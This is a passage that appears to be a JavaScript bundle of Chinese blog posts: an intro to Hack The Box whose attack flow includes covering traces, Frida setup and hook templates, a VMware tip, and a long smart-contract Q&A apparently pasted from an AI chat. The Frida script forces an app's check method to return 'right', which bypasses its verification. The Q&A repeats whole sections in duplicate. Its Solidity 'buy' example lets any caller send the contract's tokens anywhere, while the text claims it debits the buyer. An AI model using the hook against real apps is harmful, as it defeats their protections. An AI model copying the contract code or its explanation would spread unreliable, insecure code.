| RootMe       | ⭐⭐    | 有很多靶场, 有很多靶场有详细的攻击流程, 类似CTF平台不太推荐                                          |
| 春秋云镜         | ⭐⭐⭐   | 国内平台，还不错，免费的漏洞环境，可以复现，复杂的靶场需要收费                                            |


攻击流程都是大致都是一样的，看的就是细心和基础。以HACKTHEBOX为列，如何入门.

## Hack The Box
 
![alt text](../assets/img/image-117.png)

---

1. Season 6 就是第6赛季，每个月都要免费的机器可以pwn
2. machines 各种靶场，有难易都有，有的靶场有详细的攻击流程，有的没有
3. Prolab 在真实的企业环境中进行交互式黑客培训。
4. challenges 偏向CTF, 脑洞比较大，不太推荐
5. sherlocks 应急响应和安全溯源

---
## Q&A 

1. 网络问题，可以使用代理计算器，把openvpn的流量转发到代理服务器，加速扫描

## 攻击流程

1. 信息搜集
2. 漏洞利用
3. 权限提升
4. 痕迹清理`,He=`---
title: Chemistry-hack-the-box
tags:
  - htb
  - web安全
categories:
  - 网络安全
password: lidefei
---

# 思路

![alt text](../assets/img/image-119.png)
`,Be=`---
title: Frida的一些模板和配置及一些场景目录和问题记录
tags: [APP逆向,移动安全]
categories: [网络安全]
---

> 本文主要记录了Frida的一些模板和配置及一些场景目录和问题记录
> 前提是已经安装了Frida，查看其他文章

# 启动和配置

\`\`\`bash
adb root
adb shell


cd /data/local/tmp
 
# 修改 文件 权限
chmod 755 frida-server
 
# 运行文件
./frida-server


adb forward tcp:27042 tcp:27042
adb forward tcp:27043 tcp:27043

frida-ps -U
 \`\`\`


# Frida的一些模板和配置

## python模板

\`\`\`python
import frida
import sys


# 定义消息回调函数，接收 Frida 脚本发送的消息
def on_message(message, data):
    if message["type"] == "send":
        print(message["payload"])
    else:
        print(message)


# 使用包名来附加目标应用并执行 JS 代码
def hook_target_application(app_name, js_file):
    # JavaScript 脚本内容
    with open(js_file, encoding="utf-8") as fin:
        script_source = fin.read()

    # 获取 USB 设备并通过包名附加到目标应用
    # 也可以使用进程id
    device = frida.get_usb_device()

    # pid = device.spawn(package_name)
    # print(pid)
    process = device.attach(app_name)
    # 创建并加载脚本
    script = process.create_script(script_source)
    script.on("message", on_message)
    script.load()

    # 等待用户输入停止信号
    sys.stdin.read()

    # 卸载脚本并分离进程
    script.unload()
    process.detach()


# 主函数
if __name__ == "__main__":
    # 设置目标应用的包名
    app_name = "My Application"
 
    js_file = "scripts/js_file.js"
    # 调用函数进行 hook
    hook_target_application(app_name, js_file)
\`\`\`
## js模板
\`\`\`js
Java.perform(function () {
    // 获取 JNI 类
    var Activity = Java.use('com.example.myapplication.MainActivity');
    
    // 重写 getResult 方法
    Activity.check.implementation = function (str) {
        console.log('getResult called with:', str);
        
        // 调用原始方法
        var result = this.check(str);
        console.log('getResult returned:', result);
        // 返回原始结果
        result = "right";
        return result;
    };
});
\`\`\`


## 利用脚本

有这样一个场景 打开闪退
所以需要frida进行自启动app


\`\`\`
adb shell pm list packages|findstr che

frida -U -f com.chehejia.oc.m01 -l hook.js
\`\`\`
## Q 
\`process = device.attach(app_name)\` 如果使用包名的话，会报错，需要使用进程id或者应用名称
## Github也有这个issue?
![alt text](../assets/img/image-120.png)`,We=`---
title: Wmware老是网络错误 
tags: [Wmware]
categories: [计算机]
---

之前一出问题就是重启网络配置

只要确保这两个服务启动起来就可以了

![alt text](../assets/img/image-121.png)
`,$e=`---
title: 智能合约的问和答
tags: [Web3, Solidity, 智能合约, 区块链]
categories: [网络安全]
---


你提到的关于智能合约在投票系统中的可信性问题，确实是一个非常关键的讨论点，特别是智能合约在这种关键场景下的可靠性和公正性。

智能合约本身的透明性和自动化是其最大的优势，但它是否“可信”，以及是否有可能被“夹带私货”（即合约中可能存在不正当或恶意的代码），则取决于几个重要因素：

1. 合约代码的透明性
公开可见：智能合约部署到区块链后，其代码对所有人公开。任何人都可以查阅、审计合约的代码，确保它不包含不正当的行为或漏洞。这种透明性有助于增加对合约的信任。
开源和审计：如果智能合约是开源的，并经过了多方审计，尤其是独立第三方的审计，可信度会大大提高。开源的代码可以被任何开发者审查和修复，减少“夹带私货”的风险。
2. 合约审计
第三方审计：对于关键应用（如投票系统），智能合约应该经过专业的安全审计。第三方审计机构（例如 OpenZeppelin、Trail of Bits 等）会全面评估合约的安全性，寻找潜在的漏洞或恶意代码。这类审计报告可以作为可信度的一部分，向用户证明合约的安全性。
社区审计：除了专业审计外，社区的参与也非常重要。开源社区和开发者群体会对智能合约进行不断的审查和反馈，及时发现并报告潜在问题。
	**审计机构的可靠性问题：**
	你提到的关于智能合约在投票系统中的可信性问题，确实是一个非常关键的讨论点，特别是智能合约在这种关键场景下的可靠性和公正性。

	智能合约本身的透明性和自动化是其最大的优势，但它是否“可信”，以及是否有可能被“夹带私货”（即合约中可能存在不正当或恶意的代码），则取决于几个重要因素：

	1. 合约代码的透明性
	公开可见：智能合约部署到区块链后，其代码对所有人公开。任何人都可以查阅、审计合约的代码，确保它不包含不正当的行为或漏洞。这种透明性有助于增加对合约的信任。
	开源和审计：如果智能合约是开源的，并经过了多方审计，尤其是独立第三方的审计，可信度会大大提高。开源的代码可以被任何开发者审查和修复，减少“夹带私货”的风险。
	2. 合约审计
	第三方审计：对于关键应用（如投票系统），智能合约应该经过专业的安全审计。第三方审计机构（例如 OpenZeppelin、Trail of Bits 等）会全面评估合约的安全性，寻找潜在的漏洞或恶意代码。这类审计报告可以作为可信度的一部分，向用户证明合约的安全性。
	社区审计：除了专业审计外，社区的参与也非常重要。开源社区和开发者群体会对智能合约进行不断的审查和反馈，及时发现并报告潜在问题。
	3. 可验证的合约代码与逻辑
	可验证的代码逻辑：合约的核心逻辑应当是透明的、可验证的，特别是对于涉及投票和选举等高风险领域，合约必须确保投票过程中的每一笔交易都可以被追溯、验证且不可篡改。比如，投票合约应该避免一些容易被操纵的漏洞（如重复投票、隐藏投票结果、篡改计票等）。
	智能合约的验证机制：可以通过形式化验证（Formal Verification）技术对合约逻辑进行数学证明，确保合约在任何情况下都按预期执行，特别是在处理投票时，合约能够确保投票的公正性和正确性。
	4. 去中心化与信任
	去中心化：智能合约通常是部署在去中心化的区块链平台上，例如以太坊等。这意味着，合约一旦部署，无法由单一实体修改。这种去中心化特性增加了合约的可信性，因为没有一个中心化的控制者可以修改合约逻辑或操控结果。
	共识机制：区块链网络的共识机制（如以太坊的 PoW 或 PoS）确保了数据的一致性和安全性。每次合约执行时，都会通过区块链网络中的节点进行验证和记录，因此投票结果一旦提交，不易被篡改。
	5. 防止恶意操作的设计
	多重签名和审计：对于投票系统，可以采用多重签名机制，即合约的关键操作需要多个独立的方进行确认，减少单一方恶意篡改的可能性。
	不可篡改的投票记录：合约应确保投票一旦提交，即不可更改且不可删除，任何投票行为都会被永久记录在区块链上，任何人都可以查证。
	日志和审计追踪：智能合约应记录所有投票操作的日志，所有投票和更改都应该可以追溯和审计。这可以帮助用户检查是否有不正当的行为或“夹带私货”现象。
	6. 常见攻击与防范
	重入攻击（Reentrancy）：在智能合约中，重入攻击可能导致合约执行顺序的错误，进而影响投票或资金转移的结果。开发者需要使用防重入机制，例如在调用外部合约之前先更新状态。
	溢出/下溢攻击（Overflow/Underflow）：对于处理投票数等操作的合约，必须防止溢出和下溢错误。Solidity 的版本更新中引入了安全的数学运算，避免了这些问题。
	时间戳依赖：智能合约可能会依赖于区块的时间戳来确定投票的有效性。攻击者可能通过调整矿工的时间戳来操控合约行为。开发者应避免过度依赖时间戳。
	总结
	要确保投票系统中的智能合约不“夹带私货”，首先需要确保合约的代码透明且公开，经过独立审计，并且在设计时避免任何潜在的安全漏洞。通过使用去中心化的网络和共识机制，以及对合约进行形式化验证，可以大大提高合约的可信度和安全性。

如果你在实现智能合约时有任何疑问或者希望了解更多的最佳实践，随时告诉我！
3. 可验证的合约代码与逻辑
可验证的代码逻辑：合约的核心逻辑应当是透明的、可验证的，特别是对于涉及投票和选举等高风险领域，合约必须确保投票过程中的每一笔交易都可以被追溯、验证且不可篡改。比如，投票合约应该避免一些容易被操纵的漏洞（如重复投票、隐藏投票结果、篡改计票等）。
智能合约的验证机制：可以通过形式化验证（Formal Verification）技术对合约逻辑进行数学证明，确保合约在任何情况下都按预期执行，特别是在处理投票时，合约能够确保投票的公正性和正确性。
4. 去中心化与信任
去中心化：智能合约通常是部署在去中心化的区块链平台上，例如以太坊等。这意味着，合约一旦部署，无法由单一实体修改。这种去中心化特性增加了合约的可信性，因为没有一个中心化的控制者可以修改合约逻辑或操控结果。
共识机制：区块链网络的共识机制（如以太坊的 PoW 或 PoS）确保了数据的一致性和安全性。每次合约执行时，都会通过区块链网络中的节点进行验证和记录，因此投票结果一旦提交，不易被篡改。
5. 防止恶意操作的设计
多重签名和审计：对于投票系统，可以采用多重签名机制，即合约的关键操作需要多个独立的方进行确认，减少单一方恶意篡改的可能性。
不可篡改的投票记录：合约应确保投票一旦提交，即不可更改且不可删除，任何投票行为都会被永久记录在区块链上，任何人都可以查证。
日志和审计追踪：智能合约应记录所有投票操作的日志，所有投票和更改都应该可以追溯和审计。这可以帮助用户检查是否有不正当的行为或“夹带私货”现象。
6. 常见攻击与防范
重入攻击（Reentrancy）：在智能合约中，重入攻击可能导致合约执行顺序的错误，进而影响投票或资金转移的结果。开发者需要使用防重入机制，例如在调用外部合约之前先更新状态。
溢出/下溢攻击（Overflow/Underflow）：对于处理投票数等操作的合约，必须防止溢出和下溢错误。Solidity 的版本更新中引入了安全的数学运算，避免了这些问题。
时间戳依赖：智能合约可能会依赖于区块的时间戳来确定投票的有效性。攻击者可能通过调整矿工的时间戳来操控合约行为。开发者应避免过度依赖时间戳。
总结
要确保投票系统中的智能合约不“夹带私货”，首先需要确保合约的代码透明且公开，经过独立审计，并且在设计时避免任何潜在的安全漏洞。通过使用去中心化的网络和共识机制，以及对合约进行形式化验证，可以大大提高合约的可信度和安全性。

## 为啥solidity是智能合约的首选语言
Solidity 能够成为智能合约的首选语言，主要得益于其几个关键特点，使其特别适合在区块链上开发去中心化应用（DApps）和智能合约。以下是一些关键原因：

1. 专为智能合约设计
Solidity 是一种专门为以太坊平台（以及其他兼容 EVM 的区块链）设计的编程语言。它的设计目标是使得智能合约的编写更加简单、高效，并能很好地与区块链的去中心化特性兼容。它的语法与 JavaScript 和 C++ 相似，开发者可以快速上手并开始编写智能合约。

2. 以太坊兼容性和广泛支持
主流区块链平台：Solidity 是以太坊平台的官方智能合约编程语言。以太坊是目前最大的智能合约平台，并且许多其他区块链平台（如 Binance Smart Chain、Polygon、Avalanche 等）也采用了与以太坊虚拟机（EVM）兼容的技术，这使得 Solidity 在区块链开发中成为标准语言。
生态系统：以太坊拥有强大的开发者社区和广泛的工具支持。Solidity 的普及使得它在智能合约领域成为了事实上的标准，也促进了大量开发工具、框架和库的出现，如 Truffle、Hardhat 和 OpenZeppelin 等。
3. 去中心化和不可篡改性
智能合约的执行环境：Solidity 编写的合约部署到区块链上后，代码无法更改，这保证了合约的不可篡改性。区块链的去中心化和共识机制确保了合约按预期执行，无需第三方干预。Solidity 能够确保这种去中心化的特性，使得智能合约能在信任不确定的环境下得到保障。
跨平台兼容性：因为 Solidity 编写的合约可以在任何支持 EVM 的区块链平台上运行，它具有良好的跨平台兼容性，可以在多个区块链网络之间迁移。
4. 易于开发和调试
语法接近其他语言：Solidity 的语法与 JavaScript 和 C++ 等编程语言相似，这使得熟悉这些语言的开发者可以较为轻松地学习和使用 Solidity 编写智能合约。
开发工具的支持：有许多开发工具可以帮助开发者更高效地编写、测试和调试 Solidity 合约。例如，Truffle 提供了一个全栈的开发环境，Hardhat 提供了灵活的本地开发和测试框架，OpenZeppelin 提供了可重用的安全合约库。
5. 广泛的使用和成熟的社区支持
大型项目和应用的支持：Solidity 已经在很多成功的去中心化金融（DeFi）项目、NFT 项目以及其他区块链应用中得到了广泛使用，如 Uniswap、MakerDAO、Compound、Aave 等。这些项目的成功推动了 Solidity 的使用。
强大的社区：Solidity 的开发者社区非常活跃，开发者可以通过论坛、GitHub、Discord 等平台获得支持，帮助其快速解决问题并改进代码。社区不断推动语言的更新和演进，及时修复漏洞，增加功能。
6. 智能合约的灵活性和扩展性
支持多种数据类型和复杂逻辑：Solidity 允许开发者创建复杂的智能合约，支持多种数据类型、结构、映射、事件等，能够应对各种不同的业务逻辑和需求。
升级和扩展：Solidity 支持合约的部分升级，虽然智能合约一旦部署就不可修改，但开发者可以通过代理模式、合约继承等方式实现合约的灵活扩展。
7. 与区块链技术紧密结合
直接与区块链交互：Solidity 提供了与以太坊虚拟机（EVM）直接交互的能力。通过 Solidity 编写的合约可以轻松地与区块链上的其他合约、账户和资产进行交互，这使得它在去中心化应用（DApps）中非常有用。
原生支持 Gas 机制：Solidity 代码的执行需要消耗 Gas，这是一种以太坊平台上的资源管理方式。Solidity 中对 Gas 的内建支持，有助于开发者优化合约的效率，避免过度消耗区块链资源。
8. 安全性和漏洞防护
防止常见安全漏洞：Solidity 语言及其生态系统不断改进，以帮助开发者避免智能合约中的常见漏洞。OpenZeppelin 等库提供了经过审计和验证的智能合约模板，减少了开发者犯错的几率。Solidity 还加入了对溢出、重入攻击等常见安全问题的防范措施。
形式化验证：Solidity 合约可以通过形式化验证工具（如 MythX、Slither 等）来检查代码中的安全漏洞，确保智能合约的执行是安全的。


## 与其他语言的区别

1. 执行环境：区块链和虚拟机
Solidity 是专门为区块链（特别是以太坊和其他 EVM 兼容的区块链）设计的语言。它编写的代码被部署在区块链上，通过以太坊虚拟机（EVM）执行，且合约一旦部署不可更改。这使得 Solidity 与其他传统语言（如 JavaScript、Python）不同，因为它涉及到智能合约的不可篡改性和去中心化的执行环境。

传统编程语言（如 JavaScript、Python 等）则主要用于开发在中央服务器或客户端上执行的应用程序，不涉及直接与区块链交互。

| 传统语言在单一服务器上，我运行python在需要在服务器上安装python解释器
| solidity是直接操作区块链的？
2. 不可变性和持久性
Solidity 中编写的智能合约一旦部署到区块链上，它们就变得不可修改和不可删除。这种不可变性是区块链的核心特性，确保了合约在执行时的透明性和安全性。
其他编程语言（如 JavaScript、C++ 等）中的代码可以随时修改、删除或更新，通常没有像区块链那样的去中心化和不可变的机制。
3. Gas 和资源消耗
Solidity 中的每个操作（如计算、存储、读取数据等）都需要消耗“Gas”，这是区块链上的计算资源。Gas 的使用需要付费，这对合约的设计和优化有直接影响。开发者需要考虑如何减少 Gas 消耗，优化智能合约的效率。
其他编程语言（如 Python、JavaScript 等）不涉及 Gas 或区块链上的计算费用，它们的代码执行通常由中央服务器提供资源，并且不存在资源消耗的收费机制。
4. 数据存储
Solidity 中的数据存储是分布式的，存储在区块链上。这意味着数据在所有节点中复制，并且不可篡改。合约的数据存储通过 state variables 管理，存储在区块链的状态中。
其他语言（如 Python、JavaScript）中，数据通常存储在本地数据库或内存中，开发者可以自由修改或删除数据。没有像区块链中的去中心化存储机制。


如果在 Solidity 中编写的智能合约具有重大的缺陷或安全漏洞，可能会带来严重的后果，因为一旦合约被部署到区块链上，它就是不可篡改的。由于区块链的去中心化和不可修改性，合约中的缺陷或者漏洞无法直接修复。如果没有适当的预防和审计措施，漏洞可能会被攻击者利用，导致资金丢失、数据泄露或其他灾难性后果。

以下是一些可能导致重大发生的安全问题及应对策略：

1. 重入攻击（Reentrancy Attack）
问题：攻击者可以通过外部调用的方式，递归地调用合约的函数，导致状态更新前执行错误，可能导致资金被盗。
示例：最著名的重入攻击发生在 2016 年的 DAO 攻击事件中，黑客利用了一个重入漏洞，窃取了大量以太坊。
防御方法：
使用“检查-效应-交互”模式：即先修改状态，然后再进行外部调用。
使用 ReentrancyGuard 库，防止在同一交易中多次调用同一函数。
2. 整数溢出/下溢（Integer Overflow/Underflow）
问题：如果没有适当的检查，整数变量可能会溢出或下溢，导致错误的计算结果或状态更新，从而可能被恶意利用。
防御方法：
使用 SafeMath 库来执行安全的加法、减法、乘法等操作。
在 Solidity 0.8.x 版本中，溢出和下溢检查已经成为默认行为，但对于旧版本，使用 SafeMath 仍然是一个好习惯。
3. 访问控制不当（Improper Access Control）
问题：智能合约可能没有足够的访问控制，导致未经授权的用户可以执行敏感操作（如更改合约状态、转账资金等）。
防御方法：
使用 onlyOwner 或其他访问控制模式来确保只有合约的所有者或特定角色可以执行敏感操作。
使用 OpenZeppelin 的 Ownable 合约或者 AccessControl 来管理权限。
4. 竞态条件（Race Conditions）
问题：在多个用户同时与合约交互时，可能会导致合约状态的不一致，攻击者可以利用这些漏洞。
防御方法：
使用锁机制（如 ReentrancyGuard）来确保合约的状态在同一时间只有一个事务在进行。
适当使用区块时间戳和不可变的交易顺序来防止竞态条件。
5. 资金安全问题（Unsafe Ether Transfers）
问题：直接使用 transfer 或 send 可能导致安全问题，特别是在合约与外部合约交互时，可能发生意外的行为（例如，接收方合约执行回调时可能引发重入攻击）。
防御方法：
使用 call 代替 transfer 或 send，并且始终检查返回值。
对外部合约调用进行充分的安全检查和审计。
6. 缺乏审计（Lack of Audits）
问题：没有经过第三方的专业审计，可能导致合约中隐藏漏洞，未被开发者发现。
防御方法：
在部署前进行全面的代码审计，尤其是对涉及资金或敏感操作的合约。
使用自动化工具（如 MythX、Slither）来检测潜在的漏洞。
使用经过安全审计的库和框架（例如 OpenZeppelin）来减少漏洞的风险。
7. 升级合约（Upgradable Contracts）
问题：一旦合约部署，它是不可修改的。如果发现漏洞或需要添加新功能，原本的合约无法直接升级。
防御方法：
使用代理模式（Proxy Pattern），通过代理合约进行更新，保持合约的可升级性。可以使用 OpenZeppelin 的代理合约框架来实现这一点。
设计合约时要考虑到未来可能需要更新的场景，避免完全依赖一个不可修改的合约。
8. Oracle 问题（Oracle Problem）
问题：智能合约通常依赖于外部数据源（Oracle）来获取链外信息。如果 Oracle 数据源不可靠或者被攻击，可能会导致合约执行错误或不符合预期的结果。
防御方法：
使用去中心化的 Oracle 服务（如 Chainlink）来减少单点故障的风险。
在合约中实现适当的验证机制，确保来自 Oracle 的数据准确可靠。
总结
智能合约部署到区块链后不可篡改，因此在开发阶段必须特别注意代码的安全性和漏洞的修复。为避免合约中出现重大的缺陷或安全漏洞，开发者应遵循最佳实践，并通过多种手段进行防范：

使用标准的安全库（如 OpenZeppelin、SafeMath）来减少漏洞。
在发布前进行全面的审计，确保代码符合安全规范。
使用自动化工具对代码进行静态分析和漏洞扫描。
定期进行代码审查和审计，及时发现潜在的安全风险。
即使如此，仍然无法完全消除所有风险，因此在开发合约时，考虑到安全性并做好漏洞防护是至关重要的。如果合约中存在重大的安全漏洞，可能会导致资金丢失或其他严重后果，这也突出了安全审计的重要性。

## ?solidity主要用在干什么  比如java python 可以进行web开发，应用开发，为什么非要solidity呢

Solidity 的应用场景是去中心化的区块链平台，尤其是以太坊（Ethereum）及其他兼容以太坊虚拟机（EVM）的平台。因此，Solidity 的使用并不涉及传统的应用开发或 Web 开发，而是涉及到区块链上的合约逻辑，尤其是涉及到资产转移、去中心化金融（DeFi）、治理、NFTs、代币发行等领域。


1. 智能合约
定义：智能合约是存储在区块链上的自动化程序，它们能够在满足特定条件时自动执行合约条款。智能合约允许没有中介的情况下进行交易和协议执行，降低了信任成本。
为什么需要 Solidity：Java 和 Python 等语言通常用于中央化的应用开发，而区块链上的智能合约需要执行在去中心化的环境中，必须具有不可篡改性、透明性和安全性。Solidity 使得编写、部署和执行智能合约成为可能，尤其是与以太坊这样的区块链平台兼容。
2. 去中心化应用（DApps）
定义：去中心化应用（DApps）是建立在区块链上的应用，具有去中心化、开放性、透明性等特征。DApps 不依赖于传统的中央服务器，而是使用智能合约来管理应用逻辑。
为什么需要 Solidity：在 DApp 中，前端通常与传统技术栈（如 JavaScript、React）结合使用，但合约逻辑和交易管理是通过 Solidity 编写的。这是因为区块链网络上的数据需要通过智能合约来管理和处理，Solidity 提供了这种功能。
3. 去中心化金融（DeFi）
定义：去中心化金融（DeFi）指的是建立在区块链上的一系列金融服务，如借贷、交易、保险等，没有中介参与，所有操作都由智能合约执行。
为什么需要 Solidity：DeFi 应用需要通过智能合约自动执行复杂的金融交易，比如借贷、资产交换和衍生品合约。Solidity 是开发这些智能合约的核心语言，允许开发者设计和管理 DeFi 协议。
4. 代币和NFT（非同质化代币）
定义：代币和 NFTs 是区块链上的数字资产。代币通常用于代表某种资产或权益，而 NFT 是独一无二的数字资产，通常用于表示艺术品、收藏品、游戏物品等。
为什么需要 Solidity：Solidity 可以用来创建代币标准（如 ERC-20 和 ERC-721），并在区块链上生成这些代币或 NFT。通过 Solidity，开发者可以在以太坊等平台上实现发行、转移和管理代币的功能。
5. 区块链治理
定义：区块链治理涉及到对去中心化网络和协议进行管理和决策的过程。它通常通过投票或分配权利来做出决策。
为什么需要 Solidity：许多去中心化组织（DAO）使用智能合约来管理投票和决策过程。Solidity 可以编写治理合约，通过智能合约自动执行选举、提案等流程，确保治理的透明性和自动化。
6. 去中心化身份（DID）
定义：去中心化身份（DID）是一种基于区块链的身份管理系统，允许个人控制和管理自己的身份信息，不依赖于传统的身份提供者。
为什么需要 Solidity：通过 Solidity，可以编写管理去中心化身份的智能合约，确保身份数据的隐私性和安全性，用户可以控制自己的身份信息，并授权特定操作。
7. 供应链管理
定义：供应链管理是指管理商品和服务流通的过程，确保产品从生产到消费的每个环节都能被追踪和验证。
为什么需要 Solidity：通过 Solidity 编写的智能合约可以用于追踪供应链中的商品流通，确保每个环节的数据是透明和不可篡改的，增加供应链的可信度。
为什么需要 Solidity，而不是传统的编程语言？
区块链的去中心化特性：

在传统的应用开发中（如 Java 或 Python），你通常在中央服务器或客户端上运行程序，而区块链是去中心化的，所有计算和存储都分布在多个节点上。Solidity 允许开发者编写的代码能在这种去中心化环境中执行。
不可篡改性和透明性：

区块链上的数据一旦存储就不可更改，这对于智能合约的执行至关重要。Solidity 是为这种特性量身定制的，它确保部署到区块链上的合约代码是不可修改且可以被所有人透明查看的。
与区块链兼容性：

Solidity 是与区块链（特别是以太坊）的虚拟机（EVM）兼容的编程语言，直接面向区块链的数据结构和操作。而传统语言（如 Java 或 Python）并不直接支持与区块链的集成，通常需要通过中介层（如 Web3.js 或 Web3.py）与区块链进行交互。
Gas 和交易费用：

Solidity 程序的执行依赖于区块链的 Gas 机制。每次执行合约时，用户需要支付一定的费用，称为 Gas，用以补偿网络计算资源的消耗。传统编程语言不涉及这样的资源消耗机制。
总结
虽然 Java 和 Python 是非常强大的编程语言，适用于 Web 开发、应用开发等多种场景，但它们并不具备直接与区块链交互的能力。Solidity 是专门为区块链环境设计的，能够编写智能合约、管理去中心化资产和执行区块链上的交易逻辑。只有通过 Solidity，我们才能在去中心化网络上创建能够自动执行、不可篡改的合约，从而支持像 DeFi、NFT、DAO 等新兴的区块链应用。因此，Solidity 是智能合约和去中心化应用开发的首选语言。


Solidity 是一种专门为 **区块链** 和 **智能合约** 设计的编程语言，主要用于在区块链平台上编写和部署智能合约。与 Java、Python 等传统编程语言不同，Solidity 的应用场景是去中心化的区块链平台，尤其是以太坊（Ethereum）及其他兼容以太坊虚拟机（EVM）的平台。因此，Solidity 的使用并不涉及传统的应用开发或 Web 开发，而是涉及到区块链上的合约逻辑，尤其是涉及到资产转移、去中心化金融（DeFi）、治理、NFTs、代币发行等领域。

以下是 Solidity 的主要应用场景和它为什么在这些领域中至关重要：

### 1. **智能合约**
   - **定义**：智能合约是存储在区块链上的自动化程序，它们能够在满足特定条件时自动执行合约条款。智能合约允许没有中介的情况下进行交易和协议执行，降低了信任成本。
   - **为什么需要 Solidity**：Java 和 Python 等语言通常用于中央化的应用开发，而区块链上的智能合约需要执行在去中心化的环境中，必须具有不可篡改性、透明性和安全性。Solidity 使得编写、部署和执行智能合约成为可能，尤其是与以太坊这样的区块链平台兼容。

### 2. **去中心化应用（DApps）**
   - **定义**：去中心化应用（DApps）是建立在区块链上的应用，具有去中心化、开放性、透明性等特征。DApps 不依赖于传统的中央服务器，而是使用智能合约来管理应用逻辑。
   - **为什么需要 Solidity**：在 DApp 中，前端通常与传统技术栈（如 JavaScript、React）结合使用，但合约逻辑和交易管理是通过 Solidity 编写的。这是因为区块链网络上的数据需要通过智能合约来管理和处理，Solidity 提供了这种功能。

### 3. **去中心化金融（DeFi）**
   - **定义**：去中心化金融（DeFi）指的是建立在区块链上的一系列金融服务，如借贷、交易、保险等，没有中介参与，所有操作都由智能合约执行。
   - **为什么需要 Solidity**：DeFi 应用需要通过智能合约自动执行复杂的金融交易，比如借贷、资产交换和衍生品合约。Solidity 是开发这些智能合约的核心语言，允许开发者设计和管理 DeFi 协议。

### 4. **代币和NFT（非同质化代币）**
   - **定义**：代币和 NFTs 是区块链上的数字资产。代币通常用于代表某种资产或权益，而 NFT 是独一无二的数字资产，通常用于表示艺术品、收藏品、游戏物品等。
   - **为什么需要 Solidity**：Solidity 可以用来创建代币标准（如 ERC-20 和 ERC-721），并在区块链上生成这些代币或 NFT。通过 Solidity，开发者可以在以太坊等平台上实现发行、转移和管理代币的功能。

### 5. **区块链治理**
   - **定义**：区块链治理涉及到对去中心化网络和协议进行管理和决策的过程。它通常通过投票或分配权利来做出决策。
   - **为什么需要 Solidity**：许多去中心化组织（DAO）使用智能合约来管理投票和决策过程。Solidity 可以编写治理合约，通过智能合约自动执行选举、提案等流程，确保治理的透明性和自动化。

### 6. **去中心化身份（DID）**
   - **定义**：去中心化身份（DID）是一种基于区块链的身份管理系统，允许个人控制和管理自己的身份信息，不依赖于传统的身份提供者。
   - **为什么需要 Solidity**：通过 Solidity，可以编写管理去中心化身份的智能合约，确保身份数据的隐私性和安全性，用户可以控制自己的身份信息，并授权特定操作。

### 7. **供应链管理**
   - **定义**：供应链管理是指管理商品和服务流通的过程，确保产品从生产到消费的每个环节都能被追踪和验证。
   - **为什么需要 Solidity**：通过 Solidity 编写的智能合约可以用于追踪供应链中的商品流通，确保每个环节的数据是透明和不可篡改的，增加供应链的可信度。

### 为什么需要 Solidity，而不是传统的编程语言？

1. **区块链的去中心化特性**：
   - 在传统的应用开发中（如 Java 或 Python），你通常在中央服务器或客户端上运行程序，而区块链是去中心化的，所有计算和存储都分布在多个节点上。Solidity 允许开发者编写的代码能在这种去中心化环境中执行。

2. **不可篡改性和透明性**：
   - 区块链上的数据一旦存储就不可更改，这对于智能合约的执行至关重要。Solidity 是为这种特性量身定制的，它确保部署到区块链上的合约代码是不可修改且可以被所有人透明查看的。

3. **与区块链兼容性**：
   - Solidity 是与区块链（特别是以太坊）的虚拟机（EVM）兼容的编程语言，直接面向区块链的数据结构和操作。而传统语言（如 Java 或 Python）并不直接支持与区块链的集成，通常需要通过中介层（如 Web3.js 或 Web3.py）与区块链进行交互。

4. **Gas 和交易费用**：
   - Solidity 程序的执行依赖于区块链的 Gas 机制。每次执行合约时，用户需要支付一定的费用，称为 Gas，用以补偿网络计算资源的消耗。传统编程语言不涉及这样的资源消耗机制。

### 总结
虽然 Java 和 Python 是非常强大的编程语言，适用于 Web 开发、应用开发等多种场景，但它们并不具备直接与区块链交互的能力。Solidity 是专门为区块链环境设计的，能够编写智能合约、管理去中心化资产和执行区块链上的交易逻辑。只有通过 Solidity，我们才能在去中心化网络上创建能够自动执行、不可篡改的合约，从而支持像 DeFi、NFT、DAO 等新兴的区块链应用。因此，Solidity 是智能合约和去中心化应用开发的首选语言。


## ？你说solidity用作去中心，记录资产来去，移动，比如我买了一个链上的资产 所有人都知道了我的资产-10 意思是solidity编写的合约会自动记录我的资产-10，发布到链上? 

是的，你的理解是正确的！Solidity 编写的智能合约可以自动管理链上资产的转移，并将所有操作记录在区块链上。具体来说，当你通过智能合约购买一个链上的资产时，合约会自动执行相关操作，比如更新你的余额、转移资产，并将这些变化提交到区块链上。这些操作会被所有参与者和节点所验证，并不可篡改地记录在区块链中。

让我们具体看看这个过程：

### 1. **资产转移的过程**

假设你在一个基于以太坊的去中心化应用（DApp）中购买资产。资产可能是某种代币、NFT（非同质化代币）或者是其他形式的资产。这时，你和智能合约的交互大致会是这样的：

- **合约定义资产转移逻辑**：Solidity 合约会定义一些函数，用来管理资产的转移。例如，当你购买某个资产时，合约会检查你账户中的余额，确保你有足够的资金，并在成功交易后更新你的余额。
    
- **发起交易**：你发起购买请求，这通常通过你的钱包（例如 MetaMask）与智能合约进行交互。在这时，你的钱包会通过网络发送交易请求到区块链网络。
    
- **智能合约执行**：合约接收到你的交易请求后，它会检查条件（例如，你的余额是否足够）。如果条件满足，合约会更新区块链上的数据，比如减少你的余额并转移资产给你。
    

### 2. **智能合约的工作原理**

让我们假设你正在使用一个 ERC-20 代币智能合约来购买资产。智能合约中的代码可能是这样的：

solidity

复制代码

\`pragma solidity ^0.8.0;  interface IERC20 {     function transfer(address recipient, uint256 amount) external returns (bool); }  contract AssetPurchase {     IERC20 public token;      constructor(address tokenAddress) {         token = IERC20(tokenAddress);     }      function buyAsset(address buyer, uint256 amount) public {         require(token.transfer(buyer, amount), "Transfer failed");     } }\`

- **构造函数**：这个合约初始化时会设置代币的合约地址。
- **\`buyAsset\` 函数**：当用户调用 \`buyAsset\` 函数时，它会尝试通过 \`transfer\` 方法将代币转账给买家。这里的转账实际上就是一个资产的移动，你的余额会被减少，并且这次转账会自动记录在区块链上。

### 3. **区块链如何记录资产变动**

区块链的主要特性是 **不可篡改性** 和 **透明性**。当智能合约执行完毕后，所有操作会被打包进一个区块，并添加到区块链中。这个区块链上的记录是公开的，可以被任何人查询。

- **公开记录**：交易被打包进区块，并被所有网络节点验证。无论是转账、资产购买还是其他操作，都会被记录为一个区块，并永久存储在链上。
    
- **无法篡改**：一旦数据写入区块链，它就无法被修改或删除。这意味着你购买资产的记录（例如，资产-10）会永久保存在链上，所有人都可以查看，但无法改变。
    

### 4. **示例：购买资产并记录到区块链**

假设你用以太币（ETH）购买了某种代币。智能合约会执行以下操作：

1. **检查余额**：合约会检查你的账户中是否有足够的以太币来支付购买价格。
